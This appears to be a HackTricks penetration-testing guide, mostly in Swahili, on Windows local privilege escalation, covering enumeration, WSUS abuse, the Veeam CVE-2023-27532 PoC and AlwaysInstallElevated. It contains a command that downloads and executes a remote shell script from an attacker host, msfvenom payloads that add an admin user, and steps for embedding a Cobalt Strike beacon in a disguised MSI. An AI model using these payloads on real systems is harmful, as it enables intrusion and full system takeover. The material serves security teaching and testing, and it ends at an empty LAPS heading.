# Windows Local Privilege Escalation

{{#include ../../banners/hacktricks-training.md}}

### **Zana bora ya kutafuta vectors za Windows local privilege escalation:** [**WinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)

Ukurasa huu unaunganisha methodology ya jumla ya Windows privilege escalation kutoka kwenye miongozo kadhaa ya msingi.<sup>[[1]](#references)[[3]](#references)[[6]](#references)[[7]](#references)[[8]](#references)[[11]](#references)</sup> Mchakato wake wa vitendo wa enumeration pia unatokana na warsha na checklists za jamii.<sup>[[4]](#references)[[9]](#references)[[10]](#references)</sup> Maudhui ya kihistoria kuhusu mashambulizi yanajumuisha wasilisho la DerbyCon kuhusu Windows privilege escalation.<sup>[[5]](#references)</sup>

## Nadharia ya Awali ya Windows

### Access Tokens

**Ikiwa hujui Access Tokens za Windows ni nini, soma ukurasa ufuatao kabla ya kuendelea:**


{{#ref}}
access-tokens.md
{{#endref}}

### ACLs - DACLs/SACLs/ACEs

**Angalia ukurasa ufuatao kwa maelezo zaidi kuhusu ACLs - DACLs/SACLs/ACEs:**


{{#ref}}
acls-dacls-sacls-aces.md
{{#endref}}

### Integrity Levels

**Ikiwa hujui integrity levels za Windows ni nini, soma ukurasa ufuatao kabla ya kuendelea:**


{{#ref}}
integrity-levels.md
{{#endref}}

## Vidhibiti vya Usalama vya Windows

Kuna mambo mbalimbali katika Windows yanayoweza **kukuzuia kufanya enumeration ya mfumo**, kuendesha executables au hata **kugundua shughuli zako**. Unapaswa **kusoma** **ukurasa** ufuatao na kufanya **enumeration** ya **mbinu** hizi zote za **ulinzi** kabla ya kuanza enumeration ya privilege escalation:


{{#ref}}
../authentication-credentials-uac-and-efs/
{{#endref}}

Ufikiaji wa kimwili pia unaweza kutumika kubadilisha UEFI NVRAM ikiwa mfumo umezimwa, na hivyo kuanzisha mnyororo wa pre-boot DMA na Windows `SYSTEM` memory-patching:

{{#ref}}
../../hardware-physical-access/firmware-analysis/uefi-ifr-nvram-security-setting-patching.md
{{#endref}}

### Ulinzi wa Admin / UIAccess silent elevation

Michakato ya UIAccess inayoanzishwa kupitia `RAiLaunchAdminProcess` inaweza kutumiwa vibaya kufikia High IL bila prompts pale ukaguzi wa secure-path wa AppInfo unapozuiliwa. Angalia workflow maalumu ya bypass ya UIAccess/Admin Protection hapa:

{{#ref}}
uiaccess-admin-protection-bypass.md
{{#endref}}

Uenezaji wa registry wa accessibility wa Secure Desktop unaweza kutumiwa vibaya kuandika thamani yoyote kwenye registry kwa SYSTEM (RegPwn):<sup>[[18]](#references)</sup>

{{#ref}}
secure-desktop-accessibility-registry-propagation-regpwn.md
{{#endref}}

Matoleo ya hivi karibuni ya Windows pia yalianzisha njia ya LPE ya **SMB arbitrary-port**, ambapo uthibitishaji wa NTLM wa ndani wenye ruhusa za juu unaakisiwa kupitia muunganisho wa SMB TCP uliotumika tena:

{{#ref}}
local-ntlm-reflection-via-smb-arbitrary-port.md
{{#endref}}

## Taarifa za Mfumo

### Enumeration ya taarifa za toleo

Angalia ikiwa toleo la Windows lina vulnerability yoyote inayojulikana (pia angalia patches zilizotumika).

```bash
systeminfo
systeminfo | findstr /B /C:"OS Name" /C:"OS Version" #Get only that information
wmic qfe get Caption,Description,HotFixID,InstalledOn #Patches
wmic os get osarchitecture || echo %PROCESSOR_ARCHITECTURE% #Get system architecture
```

```bash
[System.Environment]::OSVersion.Version #Current OS version
Get-WmiObject -query 'select * from win32_quickfixengineering' | foreach {$_.hotfixid} #List all patches
Get-Hotfix -description "Security update" #List only "Security Update" patches
```

### Exploits za Version

[Site](https://msrc.microsoft.com/update-guide/vulnerability) hii ni muhimu kwa kutafuta maelezo ya kina kuhusu udhaifu wa usalama wa Microsoft. Database hii ina zaidi ya udhaifu 4,700 wa usalama, ikionyesha **eneo kubwa la mashambulizi** linalowasilishwa na mazingira ya Windows.

**Kwenye mfumo**

- _post/windows/gather/enum_patches_
- _post/multi/recon/local_exploit_suggester_
- [_watson_](https://github.com/rasta-mouse/Watson)
- [_winpeas_](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) — hukusanya taarifa kuhusu OS build, updates zilizosakinishwa, na advisory candidates zilizochaguliwa; thibitisha bidhaa husika na updates zilizochukua nafasi ya nyingine kabla ya kuchukulia matokeo kuwa yanatumika.

Kwa local exploit inayohusiana na version maalum, angalia **architecture ya process inayoendesha** pamoja na architecture ya OS. Kwenye Windows ya 64-bit, process ya 32-bit huathiriwa na [WOW64 file-system redirection](https://learn.microsoft.com/en-us/windows/win32/winprog64/file-system-redirector): `%windir%\System32` kwa kawaida huelekezwa kwenye directory ya mfumo ya 32-bit, huku `%windir%\Sysnative` ikiipa process hiyo ufikiaji wa directory ya mfumo ya native. Alias hii haipatikani kwa process ya 64-bit. OS build au candidate ya KB inayokosekana haithibitishi kwamba exploit inaweza kutumika; linganisha build inayoendesha, update iliyosakinishwa au iliyoichukua nafasi, architecture ya process, na prerequisites za exploit na [Microsoft security bulletin](https://learn.microsoft.com/en-us/security-updates/securitybulletins/2016/ms16-032) ya issue husika.

**Ndani ya mfumo kwa kutumia taarifa za mfumo**

- [https://github.com/AonCyberLabs/Windows-Exploit-Suggester](https://github.com/AonCyberLabs/Windows-Exploit-Suggester)
- [https://github.com/bitsadmin/wesng](https://github.com/bitsadmin/wesng)

**GitHub repos za exploits:**

- [https://github.com/nomi-sec/PoC-in-GitHub](https://github.com/nomi-sec/PoC-in-GitHub)
- [https://github.com/abatchy17/WindowsExploits](https://github.com/abatchy17/WindowsExploits)
- [https://github.com/SecWiki/windows-kernel-exploits](https://github.com/SecWiki/windows-kernel-exploits)

### Mazingira

Kuna credential/Juicy info yoyote iliyohifadhiwa kwenye env variables?

```bash
set
dir env:
Get-ChildItem Env: | ft Key,Value -AutoSize
```

### Historia ya PowerShell

```bash
ConsoleHost_history #Find the PATH where is saved

type %userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
type C:\Users\swissky\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
type $env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
cat (Get-PSReadlineOption).HistorySavePath
cat (Get-PSReadlineOption).HistorySavePath | sls passw
```

### Faili za PowerShell Transcript

Unaweza kujifunza jinsi ya kuwasha hili hapa [https://sid-500.com/2017/11/07/powershell-enabling-transcription-logging-by-using-group-policy/](https://sid-500.com/2017/11/07/powershell-enabling-transcription-logging-by-using-group-policy/)

```bash
#Check is enable in the registry
reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\Transcription
reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\Transcription
reg query HKCU\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\Transcription
reg query HKLM\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\Transcription
dir C:\Transcripts

#Start a Transcription session
Start-Transcript -Path "C:\transcripts\transcript0.txt" -NoClobber
Stop-Transcript
```

`C:\Transcripts` ni mfano tu. [PowerShell transcription policy](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.core/about/about_group_policy_settings#turn-on-powershell-transcription) kwa kawaida huhifadhi faili kwenye folda ya Documents ya kila mtumiaji, lakini mipangilio ya `OutputDirectory` au `Start-Transcript -OutputDirectory` inaweza kuelekeza faili kwenye folda inayoshirikiwa au iliyofichwa. Angalia njia halisi ya kuhifadhi na ruhusa za ACL za faili kabla ya kukagua transcript: huenda ikawa na hoja za amri na matokeo, ikiwemo credentials. Transcript inayosomeka ni kidokezo tu ikiwa maudhui yake yanaonyesha utambulisho wenye ruhusa za juu unaoweza kutumika na utambulisho huo unaweza kuingia katika muktadha husika.

### PowerShell Module Logging

Maelezo ya utekelezaji wa PowerShell pipeline hurekodiwa, yakiwemo amri zilizotekelezwa, miito ya amri na sehemu za script. Hata hivyo, huenda maelezo yote ya utekelezaji na matokeo yasirekodiwe.

Ili kuiwezesha, fuata maagizo katika sehemu ya "Transcript files" ya nyaraka, ukichagua **"Module Logging"** badala ya **"Powershell Transcription"**.

```bash
reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
reg query HKCU\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
reg query HKLM\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
```

Ili kuona matukio 15 ya mwisho kutoka kwenye logs za PowersShell, unaweza kutekeleza:

```bash
Get-WinEvent -LogName "windows Powershell" | select -First 15 | Out-GridView
```

### **PowerShell Script Block Logging**

Rekodi kamili ya shughuli na maudhui yote ya utekelezaji wa script hunaswa, kuhakikisha kwamba kila block ya code inaandikwa inapotekelezwa. Mchakato huu huhifadhi audit trail kamili ya kila shughuli, ambayo ni muhimu kwa forensics na kuchanganua tabia hasidi. Kwa kuandika shughuli zote wakati wa utekelezaji, maelezo ya kina kuhusu mchakato hutolewa.

```bash
reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
reg query HKCU\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
reg query HKLM\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
```

Matukio ya logging ya Script Block yanaweza kupatikana katika Windows Event Viewer kwenye njia: **Application and Services Logs > Microsoft > Windows > PowerShell > Operational**.\
Ili kuona matukio 20 ya mwisho, unaweza kutumia:

```bash
Get-WinEvent -LogName "Microsoft-Windows-Powershell/Operational" | select -first 20 | Out-Gridview
```

### Mipangilio ya Intaneti

```bash
reg query "HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings"
reg query "HKLM\Software\Microsoft\Windows\CurrentVersion\Internet Settings"
```

### Diski

```bash
wmic logicaldisk get caption || fsutil fsinfo drives
wmic logicaldisk get caption,description,providername
Get-PSDrive | where {$_.Provider -like "Microsoft.PowerShell.Core\FileSystem"}| ft Name,Root
```

## WSUS

Endpoint ya HTTP ya WSUS ni kidokezo cha kuanza kukagua uingiliaji wa metadata ya masasisho. Exploitation pia hutegemea iwapo client hutumia server hiyo ya WSUS, iwapo mshambulizi anaweza kuingilia au kudhibiti trafiki yake, na sera za client za kuamini na kusakinisha masasisho. URL pekee haithibitishi utekelezaji wa code. [Microsoft inapendekeza TLS kwa metadata ya WSUS](https://learn.microsoft.com/en-us/windows-server/administration/windows-server-update-services/deploy/2-configure-wsus).

Unaanza kwa kukagua iwapo mtandao unatumia sasisho la WSUS lisilotumia SSL kwa kuendesha yafuatayo kwenye cmd:

```
reg query HKLM\Software\Policies\Microsoft\Windows\WindowsUpdate /v WUServer
```

Au yafuatayo katika PowerShell:

```
Get-ItemProperty -Path HKLM:\Software\Policies\Microsoft\Windows\WindowsUpdate -Name "WUServer"
```

Ukipokea jibu kama mojawapo ya haya:

```bash
HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\WindowsUpdate
      WUServer    REG_SZ    http://xxxx-updxx.corp.internal.com:8535
```
```bash
WUServer     : http://xxxx-updxx.corp.internal.com:8530
PSPath       : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\software\policies\microsoft\windows\windowsupdate
PSParentPath : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\software\policies\microsoft\windows
PSChildName  : windowsupdate
PSDrive      : HKLM
PSProvider   : Microsoft.PowerShell.Core\Registry
```

Na ikiwa `HKLM\Software\Policies\Microsoft\Windows\WindowsUpdate\AU /v UseWUServer` au `Get-ItemProperty -Path hklm:\software\policies\microsoft\windows\windowsupdate\au -name "usewuserver"` ni sawa na `1`.

Wakati `UseWUServer` ni `1`, Windows Update hutumia huduma ya intraneti iliyosanidiwa. Hii inathibitisha sharti la awali la njia ya kuingilia trafiki ya HTTP, lakini haithibitishi kuwa kuingilia trafiki, kukubaliwa kwa update hasidi, au usakinishaji wenye ruhusa za juu kunawezekana. Inapokuwa `0`, endpoint hii mahususi ya WSUS iliyosanidiwa haichaguliwi na sera hiyo.

Ili kutumia udhaifu huu, unaweza kutumia zana kama: [Wsuxploit](https://github.com/pimps/wsuxploit), [pyWSUS ](https://github.com/GoSecure/pywsus)- Hizi ni scripts za MiTM zilizotayarishwa kwa ajili ya kuingiza updates za ‘bandia’ kwenye trafiki ya WSUS isiyotumia SSL.

Soma utafiti hapa:

{{#file}}
CTX_WSUSpect_White_Paper (1).pdf
{{#endfile}}

**WSUS CVE-2020-1013**

[**Soma ripoti kamili hapa**](https://www.gosecure.net/blog/2020/09/08/wsus-attacks-part-2-cve-2020-1013-a-windows-10-local-privilege-escalation-1-day/).<sup>[[33]](#references)</sup>\
Kimsingi, hili ndilo dosari inayotumiwa na bug hii:

> Ikiwa tuna uwezo wa kurekebisha proxy ya mtumiaji wetu wa ndani, na Windows Updates inatumia proxy iliyosanidiwa kwenye mipangilio ya Internet Explorer, basi tuna uwezo wa kuendesha [PyWSUS](https://github.com/GoSecure/pywsus) ndani ya kompyuta yetu ili kuingilia trafiki yetu wenyewe na kuendesha code kama mtumiaji mwenye ruhusa za juu kwenye kifaa chetu.
>
> Zaidi ya hayo, kwa kuwa huduma ya WSUS hutumia mipangilio ya mtumiaji wa sasa, pia itatumia certificate store yake. Tukitengeneza certificate iliyosainiwa yenyewe kwa hostname ya WSUS na kuongeza certificate hiyo kwenye certificate store ya mtumiaji wa sasa, tutaweza kuingilia trafiki ya WSUS ya HTTP na HTTPS. WSUS haitumii mifumo kama HSTS ya kutekeleza uthibitishaji wa trust-on-first-use kwenye certificate. Certificate iliyowasilishwa itakubaliwa na huduma ikiwa inaaminika na mtumiaji na ina hostname sahihi.

Unaweza kutumia udhaifu huu kwa kutumia zana ya [**WSUSpicious**](https://github.com/GoSecure/wsuspicious) (ikishatolewa).

### Updates zinazodhibitiwa na msimamizi wa WSUS

Kuna njia tofauti pale utambulisho wa sasa unapoweza **kuchapisha na kuidhinisha** updates kwenye seva ya WSUS. Kagua uanachama halisi katika kundi la `WSUS Administrators` la seva na ruhusa zozote za WSUS zilizokabidhiwa, kisha tambua kundi la kompyuta za wateja litakalopokea update iliyoidhinishwa. [Microsoft inahitaji ruhusa za WSUS Administrator ili kuidhinisha updates](https://learn.microsoft.com/en-us/powershell/module/updateservices/approve-wsusupdate), na [inaeleza uhusiano wa uaminifu wa uchapishaji](https://learn.microsoft.com/en-us/previous-versions/windows/desktop/bb902479%28v%3Dvs.85%29): wateja lazima waamini certificate ya kusaini inayotumika kwa maudhui yaliyochapishwa ndani ya mtandao. Thibitisha kuwa update husika imesainiwa na inakubaliwa, inatumika kwa lengo, na imesakinishwa katika muktadha wenye ruhusa za juu zaidi kabla ya kuichukulia kama njia ya kupandisha ruhusa. Thamani ya HTTP `WUServer` au jina la kundi pekee havithibitishi masharti hayo.

### Matumizi mabaya ya custom-update ya SUSDB: payload zisizosainiwa kupitia `.txt`/`.esd`

Huu ni ukiukaji tofauti wa mpaka wa uaminifu na kuingilia muunganisho wa HTTP wa WSUS: sharti la awali ni kuwa na ufikiaji wa kutosha wa **stored procedures za hifadhidata ya WSUS (`SUSDB`)** ili kuchapisha na kuidhinisha custom update. Njia moja ya kuingia ni kupeleka uthibitishaji wa akaunti ya kompyuta ya WSUS ya juu kwenda kwenye seva tofauti ya MSSQL inayohifadhi `SUSDB`; sharti halisi hutegemea usanidi, kwa hiyo anza kwa kuorodhesha ruhusa za `EXECUTE` badala ya kudhani kuwa unahitaji haki za msimamizi wa SQL.<sup>[[38]](#references)[[39]](#references)</sup>

Kwa njia tofauti ya shambulizi inayopeleka uthibitishaji wa mteja wa WSUS kutoka HTTP/8530 kwenda LDAP, SMB, au AD CS, tazama [Kutumia vibaya WSUS HTTP kwa relay ya NTLM](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md#abusing-wsus-http-8530-for-ntlm-relay-to-ldapsmbad-cs-esc8).

#### Jenga, lenga na uidhinishe update

Mtiririko wa kazi wa custom-update hutumia taratibu halali za WSUS kama API yenye vizuizi ya uchapishaji. Mabadiliko muhimu ya hali ni:<sup>[[38]](#references)</sup>

| Hatua | Stored procedures husika |
| --- | --- |
| Ingiza metadata ya update | `spImportUpdate` |
| Hifadhi vipande vya XML vya sharti la awali, vilivyowekwa katika lugha maalum na vilivyopanuliwa | `spSaveXMLFragment` |
| Husisha digest ya maudhui na URL inayodhibitiwa na mshambuliaji | `spSetBatchURL` |
| Orodhesha/unda kundi la kompyuta na uongeze mteja | `spGetAllTargetGroups`, `spCreateTargetGroup`, `spGetComputerTargetByName`, `spAddComputerToTargetGroup` |
| Idhinisha usakinishaji kwa kundi hilo | `spDeployUpdate` yenye `@actionID = 0` na `@isAssigned = 1` |

Jina la faili, digests, ukubwa na handler ya `CommandLineInstallation` lazima zilingane katika metadata/vipande vilivyoingizwa. Baada ya kuweka URL ya maudhui na kundi lengwa, idhini ya mwisho hufanana na mfano ufuatao; tumia vitambulishi vipya vya update, kundi na deployment badala ya kutumia tena GUID za mfano.<sup>[[38]](#references)[[39]](#references)</sup>

```sql
EXEC spDeployUpdate
  @updateID = '<update-guid>', @revisionNumber = 1,
  @actionID = 0, @targetGroupID = '<group-guid>',
  @isAssigned = 1, @deadline = '<yyyy-mm-dd hh:mm:ss>',
  @adminName = 'Administrator';
```

#### Kukwepa ukaguzi wa saini kunakochochewa na kiendelezi

Kwa kawaida WSUS hukataa maudhui ya executable yasiyo na saini holela. Hata hivyo, katika `C:\Program Files\Update Services\Services\Microsoft.UpdateServices.ContentSyncAgent.dll`, njia ya .NET `VerifyFile` huweka bendera ya ukaguzi wa cheti kuwa false jina la faili lililotolewa linapoishia kwa `.txt` au `.esd`; hivyo `CheckCertificateSignature` hurukwa bila kwanza kuthibitisha kwamba baiti hizo ni maandishi au picha halali ya ESD. Kwa hiyo, PE isiyobadilishwa yenye jina kama `payload.exe.txt` inaweza kupita ukaguzi wa maudhui na baadaye kuzinduliwa na kidhibiti cha usakinishaji cha mstari wa amri cha sasisho. Hili ni hitilafu ya sera/uchanganyaji wa aina, si kughushi saini.<sup>[[39]](#references)</sup>

```csharp
bool checkSignature = true;
if (fileName.EndsWith(".txt") || fileName.EndsWith(".esd"))
    checkSignature = false;
if (checkSignature)
    CheckCertificateSignature(/* downloaded file */);
```

#### Staging inayoendana na BITS na uendeshaji otomatiki

Kuita `spDeployUpdate` hufanya WSUS ichukue maudhui yaliyosajiliwa. Origin lazima itimize matarajio ya HTTP ya BITS: URL inayofikika pekee haitoshi kwa sababu uhamishaji hutumia mtiririko wa awali wa `HEAD`/`GET` na maombi ya byte-range. Seva isiyounga mkono Range husababisha tukio la WSUS synchronization `EventId=364` linalosema kuwa BITS inahitaji kichwa cha itifaki cha Range.<sup>[[39]](#references)</sup>

PoC ya utafiti [NotWSUSPicious](https://github.com/bagelByt3s/NotWSUSPicious) huzalisha SQL inayohitajika kwa mnyororo wa import/fragment/URL/group/deployment, inajumuisha client ya MSSQL iliyorekebishwa ili kuitekeleza, na huja na `BitsWebServer.py` kwa ajili ya staging ya maudhui. Mfano wa chini kabisa wa matumizi katika maabara iliyoidhinishwa ni:<sup>[[40]](#references)</sup>

```bash
python3 NotWSUSpicious.py \
  --wsusHostname wsus.lab.local \
  --updateFileURL 'http://payload.lab.local:8443/payload.exe.txt' \
  --updateName SecurityUpdate \
  --updateFilePath /payloads/payload.exe.txt \
  --updateArguments '' \
  --computerGroup TestGroup \
  --targetComputer workstation.lab.local
python3 BitsWebServer.py
```

#### Utekelezaji usiosimamiwa na persistence ya retry

Mwingiliano wa upande wa client hutegemea policy. `Computer Configuration > Administrative Templates > Windows Components > Windows Update > Configure Automatic Updates`, chaguo `4 - Auto download and schedule install`, husababisha update iliyoidhinishwa kupakuliwa na kusakinishwa kulingana na ratiba iliyosanidiwa bila mtumiaji kuichagua mwenyewe. Katika majaribio, payload ambayo update yake ilibaki imeshindwa/kukamilika kwa sehemu ilitolewa tena mara moja baada ya mchakato wa callback kutoka; kwa hiyo, tabia ya retry inaweza kuwa persistence ya utekelezaji unaojirudia. Hii huacha dalili nyingi kwa sababu client huonyesha hali ya update-failed.<sup>[[39]](#references)</sup>

#### Pivots za ugunduzi na hardening

Pivots muhimu za upande wa server na client katika chain hii ni:<sup>[[39]](#references)</sup>

- Kagua utekelezaji wa `SUSDB` wa `spCreateTargetGroup`, `spSetBatchURL` na `spDeployUpdate`; chunguza target groups mpya, origins za maudhui ya nje, payload za update za `.txt`/`.esd`, na deployments zilizofanywa na principals zisizotarajiwa (hasa akaunti zisizo za computer).
- Kagua `C:\Program Files\Update Services\LogFiles` kwa `ContentSyncAgent`, `FileVerified`, `FileVerficationFailed` iliyoandikwa vibaya, na `EventId=364`; linganisha verification na extension ya payload pamoja na magic ya maudhui badala ya kutegemea suffix.
- Tafuta usakinishaji wa Windows Update unaoshindwa/kujaribu tena mara kwa mara, na utekelezaji wa PE au shughuli zisizotarajiwa za child/network kutoka kwa maudhui yenye majina ya `.txt` au `.esd`.
- Hitaji Extended Protection for Authentication kwenye database service inapoungwa mkono, na zuia ufikiaji wa database kupitia network kwa WSUS server na mifumo ya kiutawala iliyoidhinishwa pekee. Punguza na kagua haki za `EXECUTE` kwenye procedures za custom-update.

## Third-Party Auto-Updaters na Agent IPC (local privesc)

Agents nyingi za enterprise hufichua uso wa IPC wa localhost na channel ya update yenye privileged access. Ikiwa enrollment inaweza kulazimishwa kuwasiliana na server ya mshambuliaji na updater ikaamini rogue root CA au ukaguzi dhaifu wa signer, mtumiaji wa local anaweza kuwasilisha MSI hasidi ambayo huduma ya SYSTEM husakinisha. Tazama technique ya jumla (iliyotokana na chain ya Netskope stAgentSvc – CVE-2025-0309) hapa:


{{#ref}}
abusing-auto-updaters-and-ipc.md
{{#endref}}

## Veeam Backup & Replication CVE-2023-27532 (SYSTEM kupitia TCP 9401)

Veeam Backup & Replication na Cloud Connect hutumia huduma kuu ya backup kwenye **TCP/9401 kwa chaguo-msingi**. [Ushauri wa Veeam](https://www.veeam.com/kb4424) unaeleza ufichuaji usiohitaji uthibitishaji wa credentials zilizosimbwa za configuration database ndani ya mpaka wa backup network; PoC tofauti ya umma inaonyesha njia ya kutekeleza command kama **NT AUTHORITY\SYSTEM**.<sup>[[12]](#references)</sup> Huenda huduma ikafungamana na anwani zilizo nje ya localhost, kwa hiyo kagua anwani na PID yake halisi.

- **Recon**: thibitisha kuwa TCP/9401 inamilikiwa na `Veeam.Backup.Service.exe`, kisha kagua product iliyosakinishwa na metadata ya patch. `netstat -ano | findstr 9401` na `(Get-Item "C:\Program Files\Veeam\Backup and Replication\Backup\Veeam.Backup.Shell.exe").VersionInfo.FileVersion` ni vidokezo, si ukaguzi kamili wa patch.
- **Matoleo ya chini yaliyorekebishwa**: Veeam inaorodhesha **11a build 11.0.1.1261 P20230227** na **12 build 12.0.0.1420 P20230223** kama matoleo ya kwanza yaliyorekebishwa; matoleo ya awali yameathiriwa. Toleo la faili lenye sehemu nne pekee haliwezi kutofautisha base build ambayo haijafanyiwa patch na patch ya baadaye kwenye build numbers hizo hizo. Thibitisha kitambulisho cha patch kwa kutumia [historia ya build ya vendor](https://www.veeam.com/kb2680) kabla ya kusema kuwa boundary build imerekebishwa.
- **Exploit**: weka PoC kama `VeeamHax.exe` pamoja na DLL zinazohitajika za Veeam kwenye directory moja, kisha anzisha payload ya SYSTEM kupitia socket ya local:

```powershell
.\VeeamHax.exe --cmd "powershell -ep bypass -c \"iex(iwr http://attacker/shell.ps1 -usebasicparsing)\""
```

PoC iliyotajwa inaonyesha utekelezaji wa amri kama SYSTEM wakati masharti yake ya ziada yametimizwa; ushauri wa vendor unaeleza suala la kufichuliwa kwa credentials.
## KrbRelayUp

Relay ya Kerberos ya ndani inaweza kupandisha ruhusa kutoka logon yenye ruhusa za chini hadi uandishi wa directory wenye ruhusa za juu wakati COM server inayofaa inathibitisha utambulisho na principal inayorelayiwa ina ruhusa kwenye object lengwa. [KrbRelay documents](https://github.com/cube0x0/KrbRelay) huandika LDAP kwa RBCD na `msDS-KeyCredentialLink` (shadow-credential); KrbRelayUp huendesha baadhi ya njia hizi kiotomatiki. Mnyororo wa RBCD unahitaji delegation inayotumika na ruhusa kwenye object lengwa, huku mnyororo wa shadow-credential ukihitaji ruhusa za kuandika key-credential na KDC inayotumia njia ya uthibitishaji wa certificate. Hakuna njia kati ya hizi inayotokana na uanachama wa domain pekee.

Kagua sera halisi ya DC kuhusu [LDAP signing](https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/ldap-signing) na [LDAPS channel-binding](https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/ldap-channel-binding), ACL ya object ya utambulisho unaorelayiwa, na viwango vya uthibitishaji na uigaji wa COM class iliyochaguliwa. Aina ya logon ya caller na muktadha wa credentials ni muhimu: session ya WinRM inaweza kutenda tofauti na logon ya mwingiliano au ya new-credentials. Firewall/OXID routing na updates zilizosakinishwa pia zinaweza kubadilisha matokeo. Chukulia sera inayoruhusu au ACL inayolingana kuwa mambo ya kukaguliwa; enumeration tulivu haipaswi kusababisha COM coercion, relay authentication, au uandishi wa directory. Shadow credential ya machine-account inaweza kusababisha machine ticket na, iwapo tu akaunti hiyo ina ruhusa zinazohitajika za directory replication, njia tofauti ya DCSync.

Tafuta **exploit katika** [**https://github.com/Dec0ne/KrbRelayUp**](https://github.com/Dec0ne/KrbRelayUp)

Kwa maelezo zaidi kuhusu mtiririko wa shambulio, angalia [https://research.nccgroup.com/2019/08/20/kerberos-resource-based-constrained-delegation-when-an-image-change-leads-to-a-privilege-escalation/](https://research.nccgroup.com/2019/08/20/kerberos-resource-based-constrained-delegation-when-an-image-change-leads-to-a-privilege-escalation/)<sup>[[36]](#references)</sup>

## AlwaysInstallElevated

**Ikiwa** funguo hizi 2 za registry **zimewashwa** (thamani ni **0x1**), basi watumiaji wa kiwango chochote cha ruhusa wanaweza **kusakinisha** (kutekeleza) faili za `*.msi` kama NT AUTHORITY\\**SYSTEM**.

```bash
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
```

### Metasploit payloads

```bash
msfvenom -p windows/adduser USER=rottenadmin PASS=P@ssword123! -f msi-nouac -o alwe.msi #No uac format
msfvenom -p windows/adduser USER=rottenadmin PASS=P@ssword123! -f msi -o alwe.msi #Using the msiexec the uac won't be prompted
```

Ikiwa una meterpreter session, unaweza kuautomate technique hii kwa kutumia module **`exploit/windows/local/always_install_elevated`**

### PowerUP

Tumia command ya `Write-UserAddMSI` kutoka PowerUp kuunda ndani ya directory ya sasa Windows MSI binary ya kufanya privilege escalation. Script hii huandika MSI installer iliyokompailiwa mapema, ambayo huomba kuongeza user/group (kwa hivyo utahitaji GIU access):

```
Write-UserAddMSI
```

Tekeleza tu binary iliyoundwa ili kupandisha privileges.

### MSI Wrapper

Soma mafunzo haya ili ujifunze jinsi ya kuunda MSI wrapper kwa kutumia zana hizi. Kumbuka kwamba unaweza kufunga faili ya "**.bat**" ikiwa **unataka tu** **kutekeleza** **mistari ya amri**


{{#ref}}
msi-wrapper.md
{{#endref}}

### Unda MSI kwa WIX


{{#ref}}
create-msi-with-wix.md
{{#endref}}

### Unda MSI kwa Visual Studio

- **Tengeneza** payload mpya ya Windows EXE TCP kwa Cobalt Strike au Metasploit katika `C:\privesc\beacon.exe`
- Fungua **Visual Studio**, chagua **Create a new project** na uandike "installer" kwenye kisanduku cha utafutaji. Chagua mradi wa **Setup Wizard** kisha ubofye **Next**.
- Ipe mradi jina, kama **AlwaysPrivesc**, tumia **`C:\privesc`** kama eneo, chagua **place solution and project in the same directory**, kisha ubofye **Create**.
- Endelea kubofya **Next** hadi ufike hatua ya 3 kati ya 4 (chagua faili za kujumuisha). Bofya **Add** na uchague payload ya Beacon uliyotengeneza. Kisha ubofye **Finish**.
- Angazia mradi wa **AlwaysPrivesc** kwenye **Solution Explorer** na katika **Properties**, badilisha **TargetPlatform** kutoka **x86** hadi **x64**.
  - Kuna properties nyingine unazoweza kubadilisha, kama **Author** na **Manufacturer**, ili kufanya app iliyosakinishwa ionekane halali zaidi.
- Bofya kulia mradi na uchague **View > Custom Actions**.
- Bofya kulia **Install** na uchague **Add Custom Action**.
- Bofya mara mbili **Application Folder**, chagua faili yako ya **beacon.exe** kisha ubofye **OK**. Hii itahakikisha payload ya beacon inatekelezwa mara tu installer inapoendeshwa.
- Chini ya **Custom Action Properties**, badilisha **Run64Bit** kuwa **True**.
- Mwishowe, **ijenge**.
  - Ikiwa onyo `File 'beacon-tcp.exe' targeting 'x64' is not compatible with the project's target platform 'x86'` litaonekana, hakikisha umeweka platform kuwa x64.

### Usakinishaji wa MSI

Ili kutekeleza **usakinishaji** wa faili hasidi ya `.msi` **chinichini:**

```
msiexec /quiet /qn /i C:\Users\Steve.INFERNO\Downloads\alwe.msi
```

Ili kutumia udhaifu huu, unaweza kutumia: _exploit/windows/local/always_install_elevated_

## Antivirus and Detectors

### Mipangilio ya Ukaguzi

Mipangilio hii huamua kinach **rekodiwa**, kwa hivyo unapaswa kuizingatia.

```
reg query HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System\Audit
```

### WEF

Windows Event Forwarding, inafurahisha kujua kumbukumbu zinatumwa wapi.

```bash
reg query HKLM\Software\Policies\Microsoft\Windows\EventLog\EventForwarding\SubscriptionManager
```

### LAPS

